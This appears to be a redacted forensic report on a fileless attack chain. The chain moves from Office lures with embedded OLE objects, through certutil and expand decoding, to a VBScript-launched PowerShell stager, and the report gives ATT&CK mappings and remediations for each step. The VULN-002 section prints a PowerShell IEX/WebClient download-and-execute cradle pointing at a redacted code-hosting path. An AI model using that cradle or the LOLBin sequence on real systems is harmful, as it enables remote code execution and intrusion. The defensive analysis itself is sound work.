# "Excellence" Incident — Fileless Attack-Chain Analysis (sanitized)

**Type:** Malware / incident forensic analysis · **Overall severity:** Critical

> **Sanitization notice.** This is a redacted version of an authored analysis
> report. All identifying and operationally sensitive details — organization and
> product names, real file names, URLs, IPs/C2, hostnames, internal share paths —
> have been removed and replaced with `[REDACTED]` or generic placeholders.
> Only generic, publicly-documented techniques (MITRE ATT&CK) remain. Nothing
> here identifies any real environment.

## Executive summary

A high-risk, multi-stage, largely **fileless** attack chain was reconstructed
across a set of submitted malicious artifacts. The adversary used Office lure
documents (DOCX/PPTX) embedding an OLE “Package” object plus a visual “Click
Here” EMF to induce user interaction, then invoked a VBScript stager that ran
PowerShell to fetch and execute a remote script from a trusted code-hosting
platform **entirely in memory**. The chain minimizes on-disk artifacts, abuses a
trusted platform, and is paired with a broad internal share target list enabling
rapid lateral movement.

**Immediate controls:** block the remote raw-script path at egress; enforce
Attack Surface Reduction (ASR) to stop Office child processes; harden PowerShell
logging and language mode; lock down administrative SMB shares.

## MITRE ATT&CK summary

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Spearphishing attachment | T1566.001 |
| Execution | User execution of embedded OLE object | T1204.002 |
| Execution | Command/scripting: VBScript → PowerShell | T1059.005 / T1059.001 |
| Defense Evasion | Deobfuscate/decode via signed utility (LOLBin) | T1140 / T1218 |
| Defense Evasion | In-memory / fileless execution | T1027 |
| Defense Evasion | Indicator removal (delete intermediates) | T1070.004 |
| Command & Control | Ingress tool transfer via trusted platform | T1105 / T1102 |
| Lateral Movement | SMB/Windows admin shares | T1021.002 |

---

## VULN-001 — Local payload reconstruction via LOLBins (Critical)

**Description.** A Windows Batch script writes a Base64 blob disguised with
`BEGIN/END CERTIFICATE` headers, decodes it into a CAB archive with a native
signed decoder, expands the CAB into an executable, runs it, then deletes the
intermediates to minimize artifacts. The chain abuses living-off-the-land
binaries (`cmd`, `certutil`, `expand`) to evade basic controls and reduce early
on-disk indicators.

**Evidence (sanitized).** A batch script performing: write Base64 → `certutil`
decode → `expand` CAB → execute `[REDACTED].exe` → delete intermediates.

**Remediation.**
- Application allow-listing (AppLocker/WDAC); block `certutil.exe` / `expand.exe`
  for standard users and from user-writable paths (`%APPDATA%`, `%TEMP%`).
- Block CAB download/execution where not required.
- Restrict write+execute in `%ProgramData%` / `%APPDATA%`.

## VULN-002 — Fileless PowerShell stager (Critical)

**Description.** A VBScript stager launches `powershell.exe` with
`IEX (New-Object Net.WebClient).DownloadData(...)` pointing at a remote script on
a trusted code-hosting platform (`raw.githubusercontent.com/[REDACTED]`),
executing it in memory (fileless). This yields remote code execution through a
trusted domain and evades file-based AV. The payload establishes interactive C2
to a remote listener at `[REDACTED C2 host:port]`, giving an inside-out shell that
bypasses inbound firewall rules.

**Evidence (sanitized).** VBS contains an `IEX` + `WebClient.DownloadData`
cradle to a `[REDACTED]` raw path, indicating live in-memory staging.

**Remediation.**
- Block the specific raw-script path (and unapproved raw destinations) at egress
  proxies/firewalls.
- ASR rules: block Office apps from spawning child processes and block obfuscated
  script execution.
- Enforce AMSI + PowerShell Script Block Logging (Event ID 4104).
- Disable PowerShell v2, enable Constrained Language Mode, tighten ExecutionPolicy.

## VULN-003 — User-driven code execution via OLE “Package” in Office lures (High)

**Description.** A lure DOCX embeds an OLE “Package” object
(`word/embeddings/oleObject1.bin`) plus an EMF “Click Here” image
(`word/media/image1.emf`) steering the user toward executing the embedded object.
A companion PPTX mirrors the pattern (`ppt/embeddings/oleObject1.bin`, with
`docProps/app.xml` listing an embedded OLE Package server). This is a reliable
user-driven entry into the fileless chain.

**Remediation.**
- Disable OLE/ActiveX in untrusted documents; enforce Protected View / sandboxed
  opening of inbound files.
- Strip/block OLE “Package” objects at mail/web gateways; quarantine attachments
  containing `embeddings/oleObject1.bin` unless business-justified.
- Warn users on embedded-OLE detection; train against “Click Here” prompts.
- Pair content controls with ASR execution controls.

## VULN-004 — External attached-template reference in DOCX (High)

**Description.** DOCX `settings.xml.rels` contains an `attachedTemplate`
relationship with `TargetMode="External"` and `Target="#"` — a non-standard
configuration consistent with template-injection tactics, a red flag even without
a full remote URL.

**Remediation.**
- Remove/normalize the attached-template relationship.
- Monitor and block external template loads.
- Apply Office Group Policy to prohibit external templates for untrusted docs.

## VULN-005 — Broad exposure of administrative / application UNC shares (Medium)

**Description.** An enumeration file lists numerous internal UNC shares,
including administrative `C$`/`D$`/`E$` paths and `[REDACTED]` application shares
across multiple subnets/hostnames — a ready-made target map for lateral movement,
staging, and collection.

**Remediation.**
- Remove/limit administrative shares where unnecessary; segment the network.
- Restrict share permissions to least privilege; monitor access to `C$`/`ADMIN$`.

## Takeaway

The chain's strength is **trust abuse + fileless execution**: a trusted document
format, trusted code-hosting, and signed system binaries, leaving minimal disk
evidence. Effective defense is behavioral — process lineage (Office → script
engines), PowerShell script-block logging, egress control, and SMB hardening —
rather than file signatures.
